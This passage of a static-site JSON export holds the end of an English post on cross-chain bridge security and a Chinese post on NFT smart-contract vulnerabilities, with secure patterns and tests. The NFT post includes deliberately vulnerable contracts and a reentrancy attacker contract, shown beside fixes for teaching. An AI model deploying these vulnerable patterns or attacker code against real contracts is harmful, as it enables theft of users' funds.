REQUIRED_SIGNATURES, \\"Not enough signatures\\");\\n        \\n        uint256 validSignatures = 0;\\n        \\n        for (uint256 i = 0; i < signatures.length; i++) {\\n            address signer = recoverSigner(hash, signatures[i]);\\n            \\n            // Check for duplicates\\n            require(!usedSigners[signer], \\"Duplicate signer\\");\\n            \\n            if (isGuardian(signer)) {\\n                usedSigners[signer] = true;\\n                validSignatures++;\\n            }\\n        }\\n        \\n        // Clean up\\n        for (uint256 i = 0; i < signatures.length; i++) {\\n            address signer = recoverSigner(hash, signatures[i]);\\n            usedSigners[signer] = false;\\n        }\\n        \\n        return validSignatures >= REQUIRED_SIGNATURES;\\n    }\\n}\\n```\\n\\n### 2. Replay Attacks\\n\\n```solidity\\ncontract ReplayProtection {\\n    mapping(bytes32 => bool) public processedTransactions;\\n    uint256 public nonce;\\n    \\n    function processTransaction(\\n        address user,\\n        uint256 amount,\\n        uint256 targetNonce,\\n        bytes[] memory signatures\\n    ) external {\\n        require(targetNonce == nonce, \\"Invalid nonce\\");\\n        \\n        bytes32 txHash = keccak256(\\n            abi.encodePacked(\\n                user,\\n                amount,\\n                targetNonce,\\n                block.chainid // Include chain ID\\n            )\\n        );\\n        \\n        require(!processedTransactions[txHash], \\"Already processed\\");\\n        require(verifySignatures(txHash, signatures), \\"Invalid signatures\\");\\n        \\n        processedTransactions[txHash] = true;\\n        nonce++;\\n        \\n        // Process transaction\\n    }\\n}\\n```\\n\\n### 3. Validator Centralization\\n\\n```solidity\\n// Decentralized validator management\\ncontract DecentralizedValidators {\\n    struct Validator {\\n        address addr;\\n        uint256 stake;\\n        bool active;\\n    }\\n    \\n    Validator[] public validators;\\n    uint256 public constant MIN_STAKE = 100000 * 1e18;\\n    uint256 public constant MIN_VALIDATORS = 13;\\n    \\n    function addValidator(address validator) external {\\n        require(validators.length < 100, \\"Max validators reached\\");\\n        \\n        // Require stake\\n        token.transferFrom(msg.sender, address(this), MIN_STAKE);\\n        \\n        validators.push(Validator({\\n            addr: validator,\\n            stake: MIN_STAKE,\\n            active: true\\n        }));\\n    }\\n    \\n    function removeValidator(uint256 index) external {\\n        require(validators.length > MIN_VALIDATORS, \\"Min validators required\\");\\n        \\n        Validator storage validator = validators[index];\\n        require(msg.sender == validator.addr, \\"Not validator\\");\\n        \\n        // Return stake\\n        token.transfer(validator.addr, validator.stake);\\n        \\n        validator.active = false;\\n    }\\n}\\n```\\n\\n## Security Best Practices\\n\\n### 1. Multi-Layer Security\\n\\n```solidity\\ncontract SecureBridge {\\n    // Layer 1: Multi-sig with sufficient decentralization\\n    uint256 public constant REQUIRED_SIGNATURES = 7;\\n    uint256 public constant TOTAL_VALIDATORS = 13;\\n    \\n    // Layer 2: Rate limiting\\n    uint256 public constant MAX_DAILY_VOLUME = 10000000 * 1e18;\\n    uint256 public dailyVolume;\\n    uint256 public lastResetTime;\\n    \\n    // Layer 3: Time delays for large transactions\\n    uint256 public constant LARGE_TX_THRESHOLD = 1000000 * 1e18;\\n    uint256 public constant TIME_DELAY = 24 hours;\\n    \\n    struct PendingTransaction {\\n        address user;\\n        uint256 amount;\\n        uint256 unlockTime;\\n        bool executed;\\n    }\\n    \\n    mapping(bytes32 => PendingTransaction) public pendingTransactions;\\n    \\n    function initiateTransfer(\\n        address user,\\n        uint256 amount,\\n        bytes32 txHash,\\n        bytes[] memory signatures\\n    ) external {\\n        require(verifySignatures(txHash, signatures), \\"Invalid signatures\\");\\n        \\n        // Check rate limit\\n        if (block.timestamp > lastResetTime + 1 days) {\\n            dailyVolume = 0;\\n            lastResetTime = block.timestamp;\\n        }\\n        \\n        require(\\n            dailyVolume + amount <= MAX_DAILY_VOLUME,\\n            \\"Daily limit exceeded\\"\\n        );\\n        \\n        dailyVolume += amount;\\n        \\n        // Large transactions require time delay\\n        if (amount >= LARGE_TX_THRESHOLD) {\\n            pendingTransactions[txHash] = PendingTransaction({\\n                user: user,\\n                amount: amount,\\n                unlockTime: block.timestamp + TIME_DELAY,\\n                executed: false\\n            });\\n            \\n            emit LargeTransactionPending(txHash, amount, block.timestamp + TIME_DELAY);\\n        } else {\\n            _executeTransfer(user, amount);\\n        }\\n    }\\n    \\n    function executeDelayedTransfer(bytes32 txHash) external {\\n        PendingTransaction storage pending = pendingTransactions[txHash];\\n        \\n        require(!pending.executed, \\"Already executed\\");\\n        require(block.timestamp >= pending.unlockTime, \\"Still locked\\");\\n        \\n        pending.executed = true;\\n        _executeTransfer(pending.user, pending.amount);\\n    }\\n}\\n```\\n\\n### 2. Comprehensive Monitoring\\n\\n```solidity\\ncontract BridgeMonitoring {\\n    event AnomalyDetected(string reason, uint256 value, uint256 threshold);\\n    \\n    uint256 public constant PRICE_DEVIATION_THRESHOLD = 5; // 5%\\n    uint256 public constant VOLUME_SPIKE_THRESHOLD = 200; // 200%\\n    \\n    uint256 public averageDailyVolume;\\n    uint256 public lastPrice;\\n    \\n    function checkAnomalies(uint256 currentVolume, uint256 currentPrice) internal {\\n        // Check volume spike\\n        if (currentVolume > averageDailyVolume * VOLUME_SPIKE_THRESHOLD / 100) {\\n            emit AnomalyDetected(\\"Volume spike\\", currentVolume, averageDailyVolume);\\n            // Trigger alert to monitoring system\\n        }\\n        \\n        // Check price deviation\\n        if (lastPrice > 0) {\\n            uint256 priceChange = currentPrice > lastPrice\\n                ? (currentPrice - lastPrice) * 100 / lastPrice\\n                : (lastPrice - currentPrice) * 100 / lastPrice;\\n                \\n            if (priceChange > PRICE_DEVIATION_THRESHOLD) {\\n                emit AnomalyDetected(\\"Price deviation\\", priceChange, PRICE_DEVIATION_THRESHOLD);\\n            }\\n        }\\n        \\n        lastPrice = currentPrice;\\n    }\\n}\\n```\\n\\n### 3. Emergency Pause Mechanism\\n\\n```solidity\\ncontract EmergencyControls {\\n    address public guardian;\\n    bool public paused;\\n    uint256 public pausedUntil;\\n    \\n    mapping(address => bool) public emergencyCouncil;\\n    uint256 public emergencyVotes;\\n    uint256 public constant REQUIRED_EMERGENCY_VOTES = 3;\\n    \\n    modifier whenNotPaused() {\\n        require(!paused || block.timestamp > pausedUntil, \\"Bridge paused\\");\\n        _;\\n    }\\n    \\n    function emergencyPause() external {\\n        require(emergencyCouncil[msg.sender], \\"Not council member\\");\\n        \\n        emergencyVotes++;\\n        \\n        if (emergencyVotes >= REQUIRED_EMERGENCY_VOTES) {\\n            paused = true;\\n            pausedUntil = block.timestamp + 7 days;\\n            emergencyVotes = 0;\\n            \\n            emit EmergencyPause(block.timestamp);\\n        }\\n    }\\n    \\n    function unpause() external {\\n        require(msg.sender == guardian, \\"Not guardian\\");\\n        paused = false;\\n        emit Unpause(block.timestamp);\\n    }\\n}\\n```\\n\\n## Testing and Auditing\\n\\n### Essential Test Cases\\n\\n```javascript\\ndescribe(\\"Bridge Security Tests\\", function() {\\n    it(\\"Should prevent signature replay attacks\\", async function() {\\n        const tx = await bridge.processTransaction(user, amount, signatures);\\n        \\n        // Try to replay the same transaction\\n        await expect(\\n            bridge.processTransaction(user, amount, signatures)\\n        ).to.be.revertedWith(\\"Already processed\\");\\n    });\\n    \\n    it(\\"Should reject duplicate signers\\", async function() {\\n        const duplicateSignatures = [sig1, sig1, sig2]; // sig1 used twice\\n        \\n        await expect(\\n            bridge.verifySignatures(hash, duplicateSignatures)\\n        ).to.be.revertedWith(\\"Duplicate signer\\");\\n    });\\n    \\n    it(\\"Should enforce rate limits\\", async function() {\\n        // Exceed daily limit\\n        await expect(\\n            bridge.transfer(DAILY_LIMIT + 1)\\n        ).to.be.revertedWith(\\"Daily limit exceeded\\");\\n    });\\n    \\n    it(\\"Should delay large transactions\\", async function() {\\n        await bridge.initiateTransfer(user, LARGE_AMOUNT, signatures);\\n        \\n        // Try to execute immediately\\n        await expect(\\n            bridge.executeDelayedTransfer(txHash)\\n        ).to.be.revertedWith(\\"Still locked\\");\\n        \\n        // Fast forward time\\n        await ethers.provider.send(\\"evm_increaseTime\\", [24 * 60 * 60]);\\n        \\n        // Now should succeed\\n        await bridge.executeDelayedTransfer(txHash);\\n    });\\n});\\n```\\n\\n## Conclusion\\n\\nCross-chain bridge security requires:\\n\\n- \ud83d\udd10 **Robust cryptographic verification**\\n- \ud83c\udfd7\ufe0f **Decentralized validator networks**\\n- \u23f1\ufe0f **Time delays for large transactions**\\n- \ud83d\udcca **Comprehensive monitoring systems**\\n- \ud83d\udea8 **Emergency response mechanisms**\\n- \ud83e\uddea **Extensive testing and auditing**\\n\\nRemember: **Bridges are high-value targets. Security must be the top priority, not an afterthought.**\\n\\n---\\n\\n**AutoSec** - Protecting the Web3 ecosystem, one bridge at a time."},{"id":"nft-security-vulnerabilities","metadata":{"permalink":"/nft-security-vulnerabilities","editUrl":"https://github.com/pfyangf/pfyangf.github.io/tree/main/blog/2025/02-02-nft-security-vulnerabilities.md","source":"@site/blog/2025/02-02-nft-security-vulnerabilities.md","title":"NFT\u667a\u80fd\u5408\u7ea6\u5b89\u5168\u6f0f\u6d1e\u5168\u89e3\u6790","description":"NFT\uff08\u975e\u540c\u8d28\u5316\u4ee3\u5e01\uff09\u5e02\u573a\u57282021-2023\u5e74\u95f4\u7206\u53d1\u5f0f\u589e\u957f\uff0c\u4f46\u968f\u4e4b\u800c\u6765\u7684\u662f\u5404\u79cd\u5b89\u5168\u95ee\u9898\u3002\u4ece\u5408\u7ea6\u6f0f\u6d1e\u5230\u9493\u9c7c\u653b\u51fb\uff0cNFT\u751f\u6001\u7cfb\u7edf\u9762\u4e34\u7740\u591a\u91cd\u5b89\u5168\u6311\u6218\u3002","date":"2025-02-02T00:00:00.000Z","tags":[{"inline":true,"label":"NFT\u5b89\u5168","permalink":"/tags/nft\u5b89\u5168"},{"inline":true,"label":"ERC-721","permalink":"/tags/erc-721"},{"inline":true,"label":"ERC-1155","permalink":"/tags/erc-1155"},{"inline":true,"label":"\u667a\u80fd\u5408\u7ea6","permalink":"/tags/\u667a\u80fd\u5408\u7ea6"},{"inline":true,"label":"Web3\u5b89\u5168","permalink":"/tags/web-3-\u5b89\u5168"}],"readingTime":6.13,"hasTruncateMarker":true,"authors":[{"name":"AutoSec Team","title":"Web3 Security Researchers","url":"https://autosec.dev","imageURL":"/img/autosec.logo.png","key":"autosec","page":null}],"frontMatter":{"slug":"nft-security-vulnerabilities","title":"NFT\u667a\u80fd\u5408\u7ea6\u5b89\u5168\u6f0f\u6d1e\u5168\u89e3\u6790","authors":["autosec"],"tags":["NFT\u5b89\u5168","ERC-721","ERC-1155","\u667a\u80fd\u5408\u7ea6","Web3\u5b89\u5168"]},"unlisted":false,"prevItem":{"title":"Cross-Chain Bridge Security: Vulnerabilities and Best Practices","permalink":"/cross-chain-bridge-security"},"nextItem":{"title":"React Hooks \u5b8c\u5168\u6307\u5357","permalink":"/react-hooks-guide"}},"content":"NFT\uff08\u975e\u540c\u8d28\u5316\u4ee3\u5e01\uff09\u5e02\u573a\u57282021-2023\u5e74\u95f4\u7206\u53d1\u5f0f\u589e\u957f\uff0c\u4f46\u968f\u4e4b\u800c\u6765\u7684\u662f\u5404\u79cd\u5b89\u5168\u95ee\u9898\u3002\u4ece\u5408\u7ea6\u6f0f\u6d1e\u5230\u9493\u9c7c\u653b\u51fb\uff0cNFT\u751f\u6001\u7cfb\u7edf\u9762\u4e34\u7740\u591a\u91cd\u5b89\u5168\u6311\u6218\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## NFT\u6807\u51c6\u6982\u8ff0\\n\\n### ERC-721 vs ERC-1155\\n\\n```solidity\\n// ERC-721: \u6bcf\u4e2a\u4ee3\u5e01\u90fd\u662f\u552f\u4e00\u7684\\ninterface IERC721 {\\n    function ownerOf(uint256 tokenId) external view returns (address);\\n    function transferFrom(address from, address to, uint256 tokenId) external;\\n    function safeTransferFrom(address from, address to, uint256 tokenId) external;\\n}\\n\\n// ERC-1155: \u652f\u6301\u6279\u91cf\u64cd\u4f5c\u548c\u534a\u540c\u8d28\u5316\u4ee3\u5e01\\ninterface IERC1155 {\\n    function balanceOf(address account, uint256 id) external view returns (uint256);\\n    function safeBatchTransferFrom(\\n        address from,\\n        address to,\\n        uint256[] calldata ids,\\n        uint256[] calldata amounts,\\n        bytes calldata data\\n    ) external;\\n}\\n```\\n\\n## \u5e38\u89c1\u5b89\u5168\u6f0f\u6d1e\\n\\n### 1. \u91cd\u5165\u653b\u51fb\\n\\n```solidity\\n// \u5b58\u5728\u91cd\u5165\u6f0f\u6d1e\u7684NFT\u5408\u7ea6\\ncontract VulnerableNFT is ERC721 {\\n    uint256 public constant PRICE = 0.1 ether;\\n    \\n    function mint() external payable {\\n        require(msg.value >= PRICE, \\"Insufficient payment\\");\\n        \\n        uint256 tokenId = totalSupply();\\n        _safeMint(msg.sender, tokenId);\\n        \\n        // \u5371\u9669\uff1a\u5728\u94f8\u9020\u540e\u9000\u6b3e\\n        if (msg.value > PRICE) {\\n            (bool success, ) = msg.sender.call{value: msg.value - PRICE}(\\"\\");\\n            require(success, \\"Refund failed\\");\\n        }\\n    }\\n}\\n\\n// \u653b\u51fb\u5408\u7ea6\\ncontract NFTAttacker is IERC721Receiver {\\n    VulnerableNFT public nft;\\n    uint256 public attackCount;\\n    \\n    function attack() external payable {\\n        nft.mint{value: msg.value}();\\n    }\\n    \\n    function onERC721Received(\\n        address,\\n        address,\\n        uint256,\\n        bytes memory\\n    ) public override returns (bytes4) {\\n        // \u91cd\u5165\u653b\u51fb\\n        if (attackCount < 10 && address(nft).balance > 0) {\\n            attackCount++;\\n            nft.mint{value: 0.1 ether}();\\n        }\\n        return this.onERC721Received.selector;\\n    }\\n    \\n    receive() external payable {\\n        // \u5728\u9000\u6b3e\u65f6\u91cd\u5165\\n        if (address(nft).balance > 0) {\\n            nft.mint{value: 0.1 ether}();\\n        }\\n    }\\n}\\n```\\n\\n**\u4fee\u590d\u65b9\u6848\uff1a**\\n\\n```solidity\\ncontract SecureNFT is ERC721, ReentrancyGuard {\\n    uint256 public constant PRICE = 0.1 ether;\\n    \\n    function mint() external payable nonReentrant {\\n        require(msg.value >= PRICE, \\"Insufficient payment\\");\\n        \\n        uint256 tokenId = totalSupply();\\n        \\n        // \u5148\u66f4\u65b0\u72b6\u6001\\n        _mint(msg.sender, tokenId);\\n        \\n        // \u6700\u540e\u5904\u7406\u9000\u6b3e\\n        if (msg.value > PRICE) {\\n            (bool success, ) = msg.sender.call{value: msg.value - PRICE}(\\"\\");\\n            require(success, \\"Refund failed\\");\\n        }\\n    }\\n}\\n```\\n\\n### 2. \u5143\u6570\u636e\u64cd\u7eb5\\n\\n```solidity\\n// \u4e0d\u5b89\u5168\uff1a\u5143\u6570\u636e\u53ef\u4ee5\u88ab\u4fee\u6539\\ncontract UnsafeMetadata is ERC721 {\\n    mapping(uint256 => string) public tokenURIs;\\n    \\n    function setTokenURI(uint256 tokenId, string memory uri) external {\\n        // \u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u4fee\u6539\uff01\\n        tokenURIs[tokenId] = uri;\\n    }\\n}\\n\\n// \u5b89\u5168\u5b9e\u73b0\\ncontract SecureMetadata is ERC721 {\\n    string private baseURI;\\n    mapping(uint256 => bytes32) public immutableMetadata;\\n    \\n    constructor(string memory _baseURI) {\\n        baseURI = _baseURI;\\n    }\\n    \\n    function mint(uint256 tokenId, bytes32 metadataHash) external {\\n        _mint(msg.sender, tokenId);\\n        // \u5143\u6570\u636e\u54c8\u5e0c\u4e0d\u53ef\u53d8\\n        immutableMetadata[tokenId] = metadataHash;\\n    }\\n    \\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\\n        require(_exists(tokenId), \\"Token does not exist\\");\\n        return string(abi.encodePacked(baseURI, Strings.toString(tokenId)));\\n    }\\n    \\n    // \u9a8c\u8bc1\u5143\u6570\u636e\u5b8c\u6574\u6027\\n    function verifyMetadata(\\n        uint256 tokenId,\\n        string memory metadata\\n    ) external view returns (bool) {\\n        return keccak256(bytes(metadata)) == immutableMetadata[tokenId];\\n    }\\n}\\n```\\n\\n### 3. \u8bbf\u95ee\u63a7\u5236\u6f0f\u6d1e\\n\\n```solidity\\n// \u6f0f\u6d1e\uff1a\u7f3a\u5c11\u8bbf\u95ee\u63a7\u5236\\ncontract VulnerableNFTMint is ERC721 {\\n    function mint(address to, uint256 tokenId) external {\\n        // \u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u94f8\u9020\uff01\\n        _mint(to, tokenId);\\n    }\\n}\\n\\n// \u5b89\u5168\u5b9e\u73b0\\ncontract SecureNFTMint is ERC721, Ownable {\\n    uint256 public maxSupply = 10000;\\n    uint256 public totalMinted;\\n    mapping(address => bool) public whitelist;\\n    \\n    // \u767d\u540d\u5355\u94f8\u9020\\n    function whitelistMint() external {\\n        require(whitelist[msg.sender], \\"Not whitelisted\\");\\n        require(totalMinted < maxSupply, \\"Max supply reached\\");\\n        \\n        whitelist[msg.sender] = false; // \u9632\u6b62\u91cd\u590d\u94f8\u9020\\n        _mint(msg.sender, totalMinted);\\n        totalMinted++;\\n    }\\n    \\n    // \u516c\u5f00\u94f8\u9020\uff08\u5e26\u9650\u5236\uff09\\n    mapping(address => uint256) public mintedPerAddress;\\n    uint256 public constant MAX_PER_ADDRESS = 5;\\n    \\n    function publicMint(uint256 amount) external payable {\\n        require(amount <= MAX_PER_ADDRESS, \\"Exceeds max per tx\\");\\n        require(\\n            mintedPerAddress[msg.sender] + amount <= MAX_PER_ADDRESS,\\n            \\"Exceeds max per address\\"\\n        );\\n        require(totalMinted + amount <= maxSupply, \\"Exceeds max supply\\");\\n        require(msg.value >= PRICE * amount, \\"Insufficient payment\\");\\n        \\n        for (uint256 i = 0; i < amount; i++) {\\n            _mint(msg.sender, totalMinted);\\n            totalMinted++;\\n        }\\n        \\n        mintedPerAddress[msg.sender] += amount;\\n    }\\n    \\n    // \u4ec5\u6240\u6709\u8005\u53ef\u4ee5\u6dfb\u52a0\u767d\u540d\u5355\\n    function addToWhitelist(address[] calldata addresses) external onlyOwner {\\n        for (uint256 i = 0; i < addresses.length; i++) {\\n            whitelist[addresses[i]] = true;\\n        }\\n    }\\n}\\n```\\n\\n### 4. \u968f\u673a\u6570\u53ef\u9884\u6d4b\u6027\\n\\n```solidity\\n// \u4e0d\u5b89\u5168\u7684\u968f\u673a\u6570\u751f\u6210\\ncontract UnsafeRandom is ERC721 {\\n    function mintRandom() external {\\n        // \u53ef\u9884\u6d4b\uff01\\n        uint256 randomId = uint256(\\n            keccak256(abi.encodePacked(block.timestamp, msg.sender))\\n        ) % 10000;\\n        \\n        _mint(msg.sender, randomId);\\n    }\\n}\\n\\n// \u4f7f\u7528 Chainlink VRF \u7684\u5b89\u5168\u5b9e\u73b0\\nimport \\"@chainlink/contracts/src/v0.8/VRFConsumerBase.sol\\";\\n\\ncontract SecureRandomNFT is ERC721, VRFConsumerBase {\\n    bytes32 internal keyHash;\\n    uint256 internal fee;\\n    \\n    mapping(bytes32 => address) public requestToSender;\\n    \\n    constructor(\\n        address _vrfCoordinator,\\n        address _link,\\n        bytes32 _keyHash,\\n        uint256 _fee\\n    ) VRFConsumerBase(_vrfCoordinator, _link) {\\n        keyHash = _keyHash;\\n        fee = _fee;\\n    }\\n    \\n    function requestRandomMint() external returns (bytes32) {\\n        require(LINK.balanceOf(address(this)) >= fee, \\"Not enough LINK\\");\\n        \\n        bytes32 requestId = requestRandomness(keyHash, fee);\\n        requestToSender[requestId] = msg.sender;\\n        \\n        return requestId;\\n    }\\n    \\n    function fulfillRandomness(\\n        bytes32 requestId,\\n        uint256 randomness\\n    ) internal override {\\n        address sender = requestToSender[requestId];\\n        uint256 tokenId = randomness % 10000;\\n        \\n        _mint(sender, tokenId);\\n    }\\n}\\n```\\n\\n## \u771f\u5b9e\u653b\u51fb\u6848\u4f8b\\n\\n### Akutars NFT \u4e8b\u4ef6\uff082022\u5e744\u6708\uff09\\n\\n**\u635f\u5931**\uff1a34 million \u7f8e\u5143\u6c38\u4e45\u9501\u5b9a\\n\\n**\u95ee\u9898\u4ee3\u7801\uff1a**\\n\\n```solidity\\ncontract AkutarsVulnerable {\\n    uint256 public totalRefundAmount;\\n    \\n    function claimRefund() external {\\n        uint256 refundAmount = refunds[msg.sender];\\n        require(refundAmount > 0, \\"No refund available\\");\\n        \\n        refunds[msg.sender] = 0;\\n        totalRefundAmount -= refundAmount;\\n        \\n        // \u95ee\u9898\uff1a\u9700\u8981\u6240\u6709\u4eba\u90fdclaim\u624d\u80fd\u63d0\u53d6\\n        require(totalRefundAmount == 0, \\"Not all refunds claimed\\");\\n        \\n        payable(owner).transfer(address(this).balance);\\n    }\\n}\\n```\\n\\n**\u95ee\u9898\u5206\u6790\uff1a**\\n- \u5408\u7ea6\u8981\u6c42\u6240\u6709\u9000\u6b3e\u90fd\u88ab\u9886\u53d6\u540e\u624d\u80fd\u63d0\u53d6\u8d44\u91d1\\n- \u5982\u679c\u6709\u4e00\u4e2a\u5730\u5740\u4e0d\u9886\u53d6\u9000\u6b3e\uff0c\u8d44\u91d1\u6c38\u4e45\u9501\u5b9a\\n- \u5b9e\u9645\u4e0a\u6709\u4e00\u4e2a\u5730\u5740\u65e0\u6cd5\u9886\u53d6\uff0c\u5bfc\u81f4\u6240\u6709\u8d44\u91d1\u88ab\u9501\\n\\n### Meebits \u5408\u7ea6\u6f0f\u6d1e\uff082021\u5e745\u6708\uff09\\n\\n**\u6f0f\u6d1e\u7c7b\u578b**\uff1a\u91cd\u5165\u653b\u51fb\\n\\n```solidity\\n// \u7b80\u5316\u7684\u6f0f\u6d1e\u4ee3\u7801\\ncontract MeebitsVulnerable {\\n    function mintWithPunk(uint256 punkIndex) external {\\n        require(punkOwner[punkIndex] == msg.sender, \\"Not punk owner\\");\\n        \\n        // \u5148\u94f8\u9020NFT\\n        _mint(msg.sender, nextTokenId);\\n        nextTokenId++;\\n        \\n        // \u540e\u6807\u8bb0\u5df2\u4f7f\u7528\\n        punkUsed[punkIndex] = true;\\n    }\\n}\\n```\\n\\n**\u653b\u51fb\u65b9\u5f0f\uff1a**\\n\u653b\u51fb\u8005\u53ef\u4ee5\u5728 `_mint` \u7684\u56de\u8c03\u4e2d\u518d\u6b21\u8c03\u7528 `mintWithPunk`\uff0c\u56e0\u4e3a `punkUsed` \u8fd8\u672a\u8bbe\u7f6e\u3002\\n\\n## \u5b89\u5168\u6700\u4f73\u5b9e\u8df5\\n\\n### 1. \u5b8c\u6574\u7684\u8bbf\u95ee\u63a7\u5236\\n\\n```solidity\\ncontract SecureNFTAccessControl is ERC721, AccessControl {\\n    bytes32 public constant MINTER_ROLE = keccak256(\\"MINTER_ROLE\\");\\n    bytes32 public constant PAUSER_ROLE = keccak256(\\"PAUSER_ROLE\\");\\n    \\n    bool public paused;\\n    \\n    modifier whenNotPaused() {\\n        require(!paused, \\"Contract is paused\\");\\n        _;\\n    }\\n    \\n    function mint(address to, uint256 tokenId) external onlyRole(MINTER_ROLE) whenNotPaused {\\n        _mint(to, tokenId);\\n    }\\n    \\n    function pause() external onlyRole(PAUSER_ROLE) {\\n        paused = true;\\n    }\\n    \\n    function unpause() external onlyRole(PAUSER_ROLE) {\\n        paused = false;\\n    }\\n}\\n```\\n\\n### 2. \u6279\u91cf\u64cd\u4f5c\u7684 Gas \u4f18\u5316\\n\\n```solidity\\ncontract GasOptimizedNFT is ERC721A {\\n    // ERC721A \u4f18\u5316\u4e86\u6279\u91cf\u94f8\u9020\u7684 gas \u6d88\u8017\\n    \\n    function batchMint(uint256 quantity) external payable {\\n        require(quantity <= 20, \\"Max 20 per tx\\");\\n        require(msg.value >= PRICE * quantity, \\"Insufficient payment\\");\\n        \\n        // \u5355\u6b21\u8c03\u7528\u94f8\u9020\u591a\u4e2a\\n        _mint(msg.sender, quantity);\\n    }\\n}\\n```\\n\\n### 3. \u7248\u7a0e\u5b9e\u73b0\uff08ERC-2981\uff09\\n\\n```solidity\\nimport \\"@openzeppelin/contracts/token/common/ERC2981.sol\\";\\n\\ncontract NFTWithRoyalty is ERC721, ERC2981 {\\n    constructor() {\\n        // \u8bbe\u7f6e\u9ed8\u8ba4\u7248\u7a0e\uff1a5%\u7ed9\u521b\u4f5c\u8005\\n        _setDefaultRoyalty(msg.sender, 500); // 500 = 5%\\n    }\\n    \\n    function setTokenRoyalty(\\n        uint256 tokenId,\\n        address receiver,\\n        uint96 feeNumerator\\n    ) external onlyOwner {\\n        _setTokenRoyalty(tokenId, receiver, feeNumerator);\\n    }\\n    \\n    function supportsInterface(bytes4 interfaceId)\\n        public\\n        view\\n        override(ERC721, ERC2981)\\n        returns (bool)\\n    {\\n        return super.supportsInterface(interfaceId);\\n    }\\n}\\n```\\n\\n### 4. \u5143\u6570\u636e\u51bb\u7ed3\u673a\u5236\\n\\n```solidity\\ncontract FreezableMetadata is ERC721 {\\n    mapping(uint256 => bool) public metadataFrozen;\\n    mapping(uint256 => string) private _tokenURIs;\\n    \\n    event MetadataFrozen(uint256 indexed tokenId);\\n    \\n    function setTokenURI(uint256 tokenId, string memory uri) external onlyOwner {\\n        require(!metadataFrozen[tokenId], \\"Metadata is frozen\\");\\n        _tokenURIs[tokenId] = uri;\\n    }\\n    \\n    function freezeMetadata(uint256 tokenId) external onlyOwner {\\n        metadataFrozen[tokenId] = true;\\n        emit MetadataFrozen(tokenId);\\n    }\\n    \\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\\n        require(_exists(tokenId), \\"Token does not exist\\");\\n        return _tokenURIs[tokenId];\\n    }\\n}\\n```\\n\\n## \u5ba1\u8ba1\u6e05\u5355\\n\\n\u5728\u90e8\u7f72NFT\u5408\u7ea6\u524d\uff0c\u786e\u4fdd\u68c0\u67e5\uff1a\\n\\n- \u2705 \u91cd\u5165\u653b\u51fb\u9632\u62a4\\n- \u2705 \u8bbf\u95ee\u63a7\u5236\u6b63\u786e\u5b9e\u73b0\\n- \u2705 \u5143\u6570\u636e\u4e0d\u53ef\u7be1\u6539\u6216\u6709\u51bb\u7ed3\u673a\u5236\\n- \u2705 \u968f\u673a\u6570\u751f\u6210\u5b89\u5168\uff08\u4f7f\u7528VRF\uff09\\n- \u2705 \u6574\u6570\u6ea2\u51fa\u4fdd\u62a4\uff08Solidity 0.8+\u81ea\u52a8\u68c0\u67e5\uff09\\n- \u2705 \u7d27\u6025\u6682\u505c\u673a\u5236\\n- \u2705 \u7248\u7a0e\u5b9e\u73b0\uff08\u5982\u9700\u8981\uff09\\n- \u2705 Gas\u4f18\u5316\\n- \u2705 \u4e8b\u4ef6\u65e5\u5fd7\u5b8c\u6574\\n- \u2705 \u5347\u7ea7\u673a\u5236\u5b89\u5168\uff08\u5982\u4f7f\u7528\u4ee3\u7406\u6a21\u5f0f\uff09\\n\\n## \u603b\u7ed3\\n\\nNFT\u5b89\u5168\u9700\u8981\u5173\u6ce8\uff1a\\n\\n1. **\u667a\u80fd\u5408\u7ea6\u5c42\u9762**\uff1a\u9632\u6b62\u91cd\u5165\u3001\u8bbf\u95ee\u63a7\u5236\u3001\u968f\u673a\u6570\u5b89\u5168\\n2. **\u5143\u6570\u636e\u5c42\u9762**\uff1a\u786e\u4fdd\u4e0d\u53ef\u7be1\u6539\u6027\u548c\u5b8c\u6574\u6027\\n3. **\u7ecf\u6d4e\u6a21\u578b\u5c42\u9762**\uff1a\u9632\u6b62\u4ef7\u683c\u64cd\u7eb5\u548c\u5957\u5229\\n4. **\u7528\u6237\u4ea4\u4e92\u5c42\u9762**\uff1a\u9632\u6b62\u9493\u9c7c\u548c\u793e\u4f1a\u5de5\u7a0b\u653b\u51fb\\n\\n\u8bb0\u4f4f\uff1a**\u4e00\u4e2a\u5c0f\u6f0f\u6d1e\u53ef\u80fd\u5bfc\u81f4\u6574\u4e2aNFT\u9879\u76ee\u7684\u5d29\u6e83**\u3002\\n\\n---\\n\\n**AutoSec\u5efa\u8bae**\uff1a\u5728\u4e3b\u7f51\u90e8\u7f72\u524d\uff0c\u52a1\u5fc5\u8fdb\u884c\u4e13\u4e1a\u5b89\u5168\u5ba1\u8ba1\u548c\u5145\u5206\u6d4b\u8bd5\u3002"},{"id":"react-hooks-guide","metadata":{"permalink":"/react-hooks-guide","editUrl":"https://github.com/pfyangf/pfyangf.github.io/tree/main/blog/2025/02-01-react-hooks-guide.md","source":"@site/blog/2025/02-01-react-hooks-guide.md","title":"React Hooks \u5b8c\u5168\u6307\u5357","description":"\u6df1\u5165\u7406\u89e3 React Hooks \u7684\u4f7f\u7528\u65b9\u6cd5\u548c\u6700\u4f73\u5b9e\u8df5","date":"2025-02-01T09:00:00.000Z","tags":[{"inline":false,"label":"React","permalink":"/tags/react","description":"React \u6846\u67b6\u76f8\u5173"},{"inline":false,"label":"\u524d\u7aef\u5f00\u53d1","permalink":"/tags/frontend","description":"\u524d\u7aef\u5f00\u53d1\u76f8\u5173\u6280\u672f\u6587\u7ae0"},{"inline":false,"label":"JavaScript","permalink":"/tags/javascript","description":"JavaScript \u7f16\u7a0b\u8bed\u8a00"},{"inline":false,"label":"\u6559\u7a0b","permalink":"/tags/tutorial","description":"\u6280\u672f\u6559\u7a0b\u548c\u6307\u5357"}],"readingTime":5.32,"hasTruncateMarker":true,"authors":[{"name":"AutoSec Team","title":"Web3 Security Researchers","url":"https://autosec.dev","imageURL":"/img/autosec.logo.png","key":"autosec","page":null}],"frontMatter":{"slug":"react-hooks-guide","title":"React Hooks \u5b8c\u5168\u6307\u5357","authors":["autosec"],"tags":["react","frontend","javascript","tutorial"],"date":"2025-02-01T09:00","description":"\u6df1\u5165\u7406\u89e3 React Hooks 